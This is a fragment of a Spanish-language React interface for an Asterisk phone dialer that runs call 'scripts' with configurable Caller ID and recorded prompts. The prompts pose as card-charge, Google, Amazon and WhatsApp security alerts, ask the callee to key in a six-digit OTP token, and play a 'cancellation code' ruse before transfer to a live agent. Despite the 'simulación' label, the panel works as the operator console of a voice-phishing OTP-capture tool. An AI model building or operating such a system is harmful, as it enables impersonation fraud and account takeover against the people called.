              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                  <Settings2 className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-base font-bold text-white">Editar Guión y Asignación de Audios</h3>
                  <p className="text-xs text-slate-400">
                    Personaliza los nombres, Caller ID y las 4 locuciones pregrabadas de esta entidad
                  </p>
                </div>
              </div>
              <button
                type="button"
                onClick={() => {
                  setIsEntityModalOpen(false);
                  setEditingEntity(null);
                }}
                className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition-all"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Body */}
            <div className="p-5 space-y-5 max-h-[75vh] overflow-y-auto">
              {!isAdmin && (
                <div className="p-3 bg-amber-500/10 border border-amber-500/30 rounded-xl text-amber-300 text-xs flex items-center gap-2">
                  <Lock className="w-4 h-4 text-amber-400 shrink-0" />
                  <span>
                    <strong>Modo Solo Lectura:</strong> Solo los usuarios con rol de <strong>Administrador</strong> tienen privilegios para editar o guardar nombres, Caller IDs y audios de este guión.
                  </span>
                </div>
              )}

              {/* Bloque 1: Datos de la Entidad */}
              <div className="space-y-3">
                <h4 className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
                  <Building2 className="w-3.5 h-3.5 text-emerald-400" />
                  <span>1. Identidad de la Simulación</span>
                </h4>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Nombre de la Campaña / Servicio</label>
                    <input
                      type="text"
                      value={editingEntity.name}
                      onChange={(e) => setEditingEntity({ ...editingEntity, name: e.target.value })}
                      disabled={!isAdmin}
                      placeholder="ej. Centro de Atención al Cliente"
                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Subtítulo / Situación de Fraude</label>
                    <input
                      type="text"
                      value={editingEntity.subtitle}
                      onChange={(e) => setEditingEntity({ ...editingEntity, subtitle: e.target.value })}
                      disabled={!isAdmin}
                      placeholder="ej. Transferencia desconocida"
                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    />
                  </div>
                </div>

                {/* Campaña de Marcación Vinculada */}
                <div className="space-y-1">
                  <label className="text-xs font-semibold text-slate-300 flex items-center gap-1.5">
                    <Target className="w-3.5 h-3.5 text-emerald-400" />
                    <span>Campaña de Marcación Asociada por Defecto</span>
                  </label>
                  <select
                    value={editingEntity.campaignId || dialingCampaigns.find((c) => c.entityId === editingEntity.id)?.id || 'camp-bank'}
                    onChange={(e) => {
                      const selectedCamp = dialingCampaigns.find((c) => c.id === e.target.value);
                      setEditingEntity({
                        ...editingEntity,
                        campaignId: e.target.value,
                        campaignName: selectedCamp?.name,
                      });
                    }}
                    disabled={!isAdmin}
                    className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                  >
                    {dialingCampaigns.map((camp) => (
                      <option key={camp.id} value={camp.id}>
                        {camp.name} ({camp.leads.length} contactos)
                      </option>
                    ))}
                  </select>
                </div>

                {/* Estado Activo / Inactivo para asignación a Call Centers y Usuarios */}
                <div className="flex items-center justify-between p-3.5 rounded-xl bg-slate-950 border border-emerald-500/30">
                  <div className="flex items-center gap-2.5">
                    <div className="p-1.5 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                      <CheckCircle2 className="w-4 h-4" />
                    </div>
                    <div>
                      <div className="text-xs font-bold text-white flex items-center gap-2">
                        <span>Guión Activo (Disponible en Call Centers y Usuarios)</span>
                        <span
                          className={`px-2 py-0.5 rounded text-[10px] font-bold border ${
                            editingEntity.isActive !== false
                              ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                              : 'bg-slate-800 text-slate-400 border-slate-700'
                          }`}
                        >
                          {editingEntity.isActive !== false ? 'Activo' : 'Inactivo'}
                        </span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Solo los guiones marcados como Activos aparecen al asignar permisos a Call Centers y Usuarios.
                      </div>
                    </div>
                  </div>
                  <label className={`relative inline-flex items-center ${isAdmin ? 'cursor-pointer' : 'cursor-not-allowed opacity-60'} shrink-0`}>
                    <input
                      type="checkbox"
                      checked={editingEntity.isActive !== false}
                      onChange={(e) => setEditingEntity({ ...editingEntity, isActive: e.target.checked })}
                      disabled={!isAdmin}
                      className="sr-only peer"
                    />
                    <div className="w-9 h-5 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-emerald-500"></div>
                  </label>
                </div>

                {/* Bloque de Bloqueo Manual isLocked */}
                <div className="flex items-center justify-between p-3.5 rounded-xl bg-slate-950 border border-amber-500/30">
                  <div className="flex items-center gap-2.5">
                    <div className="p-1.5 rounded-lg bg-amber-500/10 text-amber-400 border border-amber-500/20">
                      <Lock className="w-4 h-4" />
                    </div>
                    <div>
                      <div className="text-xs font-bold text-white flex items-center gap-2">
                        <span>Bloqueo Manual del Guión (isLocked: true)</span>
                        {editingEntity.isLocked && (
                          <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/40">
                            Activo
                          </span>
                        )}
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Previene que la sincronización automática sobrescriba los audios y textos asignados a esta entidad.
                      </div>
                    </div>
                  </div>
                  <label className={`relative inline-flex items-center ${isAdmin ? 'cursor-pointer' : 'cursor-not-allowed opacity-60'} shrink-0`}>
                    <input
                      type="checkbox"
                      checked={!!editingEntity.isLocked}
                      onChange={(e) => setEditingEntity({ ...editingEntity, isLocked: e.target.checked })}
                      disabled={!isAdmin}
                      className="sr-only peer"
                    />
                    <div className="w-9 h-5 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-amber-500"></div>
                  </label>
                </div>
              </div>

              {/* Bloque 2: Asignación de los 4 Audios */}
              <div className="space-y-3 pt-3 border-t border-slate-800">
                <div className="flex items-center justify-between">
                  <h4 className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
                    <Volume2 className="w-3.5 h-3.5 text-emerald-400" />
                    <span>2. Locuciones Pregrabadas Asignadas a este Guión</span>
                  </h4>
                  <span className="text-[11px] text-slate-400">Escucha con Play antes de guardar</span>
                </div>

                {/* 1. Saludo / Alerta Inicial */}
                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-emerald-300 flex items-center gap-1.5">
                        <Volume2 className="w-3.5 h-3.5 text-emerald-400" />
                        <span>1. Saludo / Alerta Inicial (Intro)</span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Lo que escucha el cliente inmediatamente al contestar la llamada.
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(editingEntity.introAudioPath, 'modal_intro')}
                      disabled={!editingEntity.introAudioPath}
                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
                      title="Reproducir audio"
                    >
                      {playingAudioKey === 'modal_intro' ? (
                        <Pause className="w-4 h-4 text-emerald-400 animate-pulse" />
                      ) : (
                        <Play className="w-4 h-4 text-slate-300" />
                      )}
                    </button>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <select
                      value={editingEntity.introAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, introAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    >
                      <option value="custom/bienvenida_corporativa">custom/bienvenida_corporativa (Bienvenida Corporativa)</option>
                      <option value="custom/alerta_cargo_tarjeta">custom/alerta_cargo_tarjeta</option>
                      <option value="custom/alerta_migracion_whatsapp">custom/alerta_migracion_whatsapp</option>
                      <option value="custom/alerta_seguridad_google">custom/alerta_seguridad_google</option>
                      <option value="custom/alerta_compra_amazon">custom/alerta_compra_amazon</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={editingEntity.introAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, introAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      placeholder="Ruta personalizada (ej. custom/mi_audio)"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    />
                  </div>
                </div>

                {/* 2. Solicitud OTP */}
                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-purple-300 flex items-center gap-1.5">
                        <KeyRound className="w-3.5 h-3.5 text-purple-400" />
                        <span>2. Solicitud de Código OTP (Prompt)</span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Locución que pide a la persona ingresar los dígitos de su código de seguridad.
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(editingEntity.promptAudioPath, 'modal_prompt')}
                      disabled={!editingEntity.promptAudioPath}
                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
                      title="Reproducir audio"
                    >
                      {playingAudioKey === 'modal_prompt' ? (
                        <Pause className="w-4 h-4 text-purple-400 animate-pulse" />
                      ) : (
                        <Play className="w-4 h-4 text-slate-300" />
                      )}
                    </button>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <select
                      value={editingEntity.promptAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, promptAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-purple-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    >
                      <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos ("Por favor digite su TOKEN de 6 dígitos") [RECOMENDADO]</option>
                      <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos ("Por favor digite su TOKEN de 6 dígitos")</option>
                      <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp (Estándar)</option>
                      <option value="custom/solicitar_otp_tarjeta">custom/solicitar_otp_tarjeta</option>
                      <option value="custom/solicitar_codigo_sms">custom/solicitar_codigo_sms</option>
                      <option value="custom/solicitar_codigo_google">custom/solicitar_codigo_google</option>
                      <option value="custom/solicitar_codigo_amazon">custom/solicitar_codigo_amazon</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={editingEntity.promptAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, promptAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      placeholder="Ruta personalizada (ej. custom/solicitar_otp)"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-purple-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    />
                  </div>
                </div>

                {/* 3. Transferencia a Asesor (Opción 1) */}
                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-sky-300 flex items-center gap-1.5">
                        <PhoneForwarded className="w-3.5 h-3.5 text-sky-400" />
                        <span>3. Transferencia a Asesor (Opción 1 - "Un momento por favor...")</span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Audio reproducido cuando el cliente presiona 1 antes de conectar a tu softphone X-Lite ({agentExtension}).
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(editingEntity.agentAudioPath, 'modal_agent')}
                      disabled={!editingEntity.agentAudioPath}
                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
                      title="Reproducir audio"
                    >
                      {playingAudioKey === 'modal_agent' ? (
                        <Pause className="w-4 h-4 text-sky-400 animate-pulse" />
                      ) : (
                        <Play className="w-4 h-4 text-slate-300" />
                      )}
                    </button>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <select
                      value={editingEntity.agentAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, agentAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-sky-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    >
                      <option value="custom/conectar_asesor">custom/conectar_asesor ("Un momento, transfiriendo con asesor...")</option>
                      <option value="custom/conectar_asesor">custom/conectar_asesor</option>
                      <option value="custom/conectar_asesor_tarjetas">custom/conectar_asesor_tarjetas</option>
                      <option value="custom/conectar_soporte_tecnico">custom/conectar_soporte_tecnico</option>
                      <option value="custom/conectar_soporte_cuentas">custom/conectar_soporte_cuentas</option>
                      <option value="custom/conectar_soporte_pedidos">custom/conectar_soporte_pedidos</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={editingEntity.agentAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, agentAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      placeholder="Ruta personalizada (ej. custom/conectar_asesor)"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-sky-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    />
                  </div>
                </div>

                {/* 4. Validación Exitosa */}
                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-emerald-300 flex items-center gap-1.5">
                        <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                        <span>4. Confirmación / Éxito OTP</span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Mensaje final tras capturar o validar exitosamente el código.
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(editingEntity.successAudioPath, 'modal_success')}
                      disabled={!editingEntity.successAudioPath}
                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
                      title="Reproducir audio"
                    >
                      {playingAudioKey === 'modal_success' ? (
                        <Pause className="w-4 h-4 text-emerald-400 animate-pulse" />
                      ) : (
                        <Play className="w-4 h-4 text-slate-300" />
                      )}
                    </button>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <select
                      value={editingEntity.successAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    >
                      <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
                      <option value="custom/tarjeta_protegida">custom/tarjeta_protegida</option>
                      <option value="custom/verificacion_exitosa">custom/verificacion_exitosa</option>
                      <option value="custom/acceso_restringido_exito">custom/acceso_restringido_exito</option>
                      <option value="custom/pedido_cancelado_exito">custom/pedido_cancelado_exito</option>
                      <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={editingEntity.successAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      placeholder="Ruta personalizada (ej. custom/exito)"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    />
                  </div>
                </div>

                {/* 5. Música de Hold / Espera del Guión (MOH) */}
                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-amber-300 flex items-center gap-1.5">
                        <Music className="w-3.5 h-3.5 text-amber-400" />
                        <span>5. Música de Hold / Espera del Guión (MOH)</span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Pista musical reproducida al cliente cuando se pone en espera (Hold) en este guión específico.
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(editingEntity.holdMusicAudioPath || 'default', 'modal_hold')}
                      disabled={!editingEntity.holdMusicAudioPath || editingEntity.holdMusicAudioPath === 'default'}
                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all disabled:opacity-40"
                      title="Reproducir música de hold"
                    >
                      {playingAudioKey === 'modal_hold' ? (
                        <Pause className="w-4 h-4 text-amber-400 animate-pulse" />
                      ) : (
                        <Play className="w-4 h-4 text-slate-300" />
                      )}
                    </button>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <select
                      value={editingEntity.holdMusicAudioPath || 'default'}
                      onChange={(e) => setEditingEntity({ ...editingEntity, holdMusicAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-amber-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    >
                      <option value="default">default (Música por Defecto de Asterisk)</option>
                      <option value="custom/moh_corporate_loop">custom/moh_corporate_loop (Música Corporativa Suave)</option>
                      <option value="custom/moh_digital_hold">custom/moh_digital_hold (Tono Digital Alta Fidelidad)</option>
                      <option value="custom/moh_jazz_telecom">custom/moh_jazz_telecom (PBX Telecom Smooth Tone)</option>
                      <option value="custom/un_momento_validando_informacion">custom/un_momento_validando_informacion (Locución con fondo)</option>
                      {audios
                        .filter((a) => a.category === 'hold_music' || a.category === 'custom')
                        .map((a) => (
                          <option key={a.id} value={a.asteriskPath}>
                            {a.name} ({a.asteriskPath})
                          </option>
                        ))}
                    </select>
                    <input
                      type="text"
                      value={editingEntity.holdMusicAudioPath || 'default'}
                      onChange={(e) => setEditingEntity({ ...editingEntity, holdMusicAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      placeholder="default (Asterisk) o custom/mi_musica_hold"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-amber-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    />
                  </div>
                </div>

                {/* 6. Audio Modo Código de Cancelación (al presionar 1) */}
                <div className="p-3.5 rounded-xl bg-slate-950 border border-amber-500/30 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-amber-300 flex items-center gap-1.5">
                        <ShieldCheck className="w-3.5 h-3.5 text-amber-400" />
                        <span>6. Audio al Marcar 1: Enviando Código de Cancelación</span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Locución reproducida al cliente cuando presiona 1 en el Modo 4: "Un momento por favor, le estamos enviando un código de cancelación".
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(editingEntity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion', 'modal_cancel_wait')}
                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
                      title="Reproducir audio"
                    >
                      {playingAudioKey === 'modal_cancel_wait' ? (
                        <Pause className="w-4 h-4 text-amber-400 animate-pulse" />
                      ) : (
                        <Play className="w-4 h-4 text-slate-300" />
                      )}
                    </button>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <select
                      value={editingEntity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'}
                      onChange={(e) => setEditingEntity({ ...editingEntity, cancelCodeAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-amber-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    >
                      <option value="custom/enviando_codigo_cancelacion">custom/enviando_codigo_cancelacion (Estándar)</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={editingEntity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'}
                      onChange={(e) => setEditingEntity({ ...editingEntity, cancelCodeAudioPath: e.target.value })}
                      disabled={!isAdmin}
                      placeholder="custom/enviando_codigo_cancelacion"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-amber-500 disabled:opacity-60 disabled:cursor-not-allowed"
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Footer */}
            <div className="p-4 border-t border-slate-800 bg-slate-950/60 flex items-center justify-between gap-3">
              <div>
                {canEditEntityCatalog && campaignEntities.length > 1 && (
                  confirmDeleteId === editingEntity.id ? (
                    <div className="flex items-center gap-2">
                      <span className="text-xs text-rose-400 font-bold">¿Seguro que deseas eliminar este guión?</span>
                      <button
                        type="button"
                        onClick={() => handleDeleteEntity(editingEntity.id)}
                        className="px-3 py-1.5 rounded-lg text-xs font-bold bg-rose-600 hover:bg-rose-500 text-white shadow transition-all"
                      >
                        Sí, eliminar
                      </button>
                      <button
                        type="button"
                        onClick={() => setConfirmDeleteId(null)}
                        className="px-2 py-1.5 rounded-lg text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all"
                      >
                        Cancelar
                      </button>
                    </div>
                  ) : (
                    <button
                      type="button"
                      onClick={() => setConfirmDeleteId(editingEntity.id)}
                      className="px-3 py-2 rounded-xl text-xs font-semibold bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 transition-all flex items-center gap-1.5"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                      <span>Eliminar este guión</span>
                    </button>
                  )
                )}
              </div>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => {
                    setIsEntityModalOpen(false);
                    setEditingEntity(null);
                  }}
                  className="px-4 py-2 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all"
                >
                  {canEditEntityCatalog ? 'Cancelar' : 'Cerrar'}
                </button>
                {canEditEntityCatalog ? (
                  <>
                    <button
                      type="button"
                      onClick={() => handleSaveEntity({ ...editingEntity, isLocked: true })}
                      disabled={!editingEntity.name.trim()}
                      className="px-3.5 py-2 rounded-xl text-xs font-bold bg-amber-500 hover:bg-amber-400 text-slate-950 shadow-lg shadow-amber-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5"
                      title="Guardar y activar bloqueo manual (isLocked: true)"
                    >
                      <Lock className="w-3.5 h-3.5" />
                      <span>Guardar y Bloquear (isLocked)</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => handleSaveEntity(editingEntity)}
                      disabled={!editingEntity.name.trim()}
                      className="px-4 py-2 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black shadow-lg shadow-emerald-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5"
                    >
                      <Save className="w-4 h-4" />
                      <span>Guardar Configuración</span>
                    </button>
                  </>
                ) : (
                  <div className="inline-flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-medium bg-amber-500/10 border border-amber-500/30 text-amber-300">
                    <Lock className="w-3.5 h-3.5 text-amber-400" />
                    <span>Solo el Super Administrador edita el catálogo global</span>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Modal para Agregar Número / Contacto a la Campaña Activa */}
      {isAddingLeadModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 overflow-y-auto animate-fadeIn">
          <div className="bg-slate-900 border border-slate-700 rounded-2xl w-full max-w-md overflow-hidden shadow-2xl space-y-4 my-8">
            <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/60">
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                  <UserPlus className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-base font-bold text-white">Agregar Contacto a la Campaña</h3>
                  <p className="text-xs text-slate-400">
                    {dialingCampaigns.find((c) => c.id === selectedCampaignId)?.name || 'Campaña Activa'}
                  </p>
                </div>
              </div>
              <button
                type="button"
                onClick={() => setIsAddingLeadModalOpen(false)}
                className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition-all cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <form onSubmit={handleAddLeadToCampaign} className="p-5 space-y-4">
              <div className="space-y-1.5">
                <label className="text-xs font-bold text-slate-200 uppercase tracking-wider">
                  Número de Teléfono a Marcar <span className="text-rose-400">*</span>
                </label>
                <input
                  type="text"
                  required
                  value={newLeadNumber}
                  onChange={(e) => setNewLeadNumber(e.target.value)}
                  placeholder="ej. 16104803845 o 18099602110"
                  className="w-full px-3.5 py-2.5 bg-slate-950 border border-slate-800 rounded-xl text-sm font-mono text-white focus:outline-none focus:border-emerald-500 font-bold"
                  autoFocus
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-bold text-slate-200 uppercase tracking-wider">
                  Nombre del Cliente / Titular (Opcional)
                </label>
                <input
                  type="text"
                  value={newLeadName}
                  onChange={(e) => setNewLeadName(e.target.value)}
                  placeholder="ej. Juan Pérez (Atención al Cliente)"
                  className="w-full px-3.5 py-2.5 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-bold text-slate-200 uppercase tracking-wider">
                  Notas / Situación de Fraude
                </label>
                <input
                  type="text"
                  value={newLeadNotes}
                  onChange={(e) => setNewLeadNotes(e.target.value)}
                  placeholder="ej. Alerta cargo $320 USD Amazon"
                  className="w-full px-3.5 py-2.5 bg-slate-950 border border-slate-800 rounded-xl text-xs text-slate-200 focus:outline-none focus:border-emerald-500"
                />
              </div>

              <div className="pt-2 flex items-center justify-end gap-2">
                <button
                  type="button"
                  onClick={() => setIsAddingLeadModalOpen(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all cursor-pointer"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={!newLeadNumber.trim()}
                  className="px-4 py-2 rounded-xl text-xs font-black bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 shadow-md shadow-emerald-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5 cursor-pointer"
                >
                  <Check className="w-4 h-4" />
                  <span>Guardar y Cargar al Marcador</span>
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
